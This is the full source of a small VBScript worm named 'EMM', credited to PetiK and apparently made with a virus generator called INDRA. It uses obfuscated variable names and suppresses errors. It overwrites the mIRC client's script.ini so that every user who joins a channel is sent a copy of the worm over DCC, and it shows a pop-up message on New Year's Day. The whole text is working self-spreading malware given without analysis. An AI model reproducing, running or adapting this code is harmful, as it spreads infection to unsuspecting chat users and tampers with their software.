'Worm Name: EMM
'Written By: PetiK
'[INDRA]
On Error Resume Next
qiljlnvhupotbbf = WScript.ScriptFullName
Set qhwftocbavkmuci = CreateObject("WScript.Shell")
Set chvvdcgooiuxiaq = CreateObject("Scripting.FileSystemObject")
Set kediofsaktkqvrc = chvvdcgooiuxiaq.CreateTextFile("C:\mirc\script.ini", True)
kediofsaktkqvrc.WriteLine "[script]"
kediofsaktkqvrc.WriteLine "n0=ON 1:JOIN:#:{ if ( $nick != $me ) {"
kediofsaktkqvrc.Write "n1=/dcc  send$nick """
kediofsaktkqvrc.Write qiljlnvhupotbbf
kediofsaktkqvrc.WriteLine """ }"
kediofsaktkqvrc.Close
If (Month(Now) = 1) and (Day(Now) = 1) Then MsgBox "ATTENTION", 0, "Hi !"
'Generated with [INDRA] v0.4es.
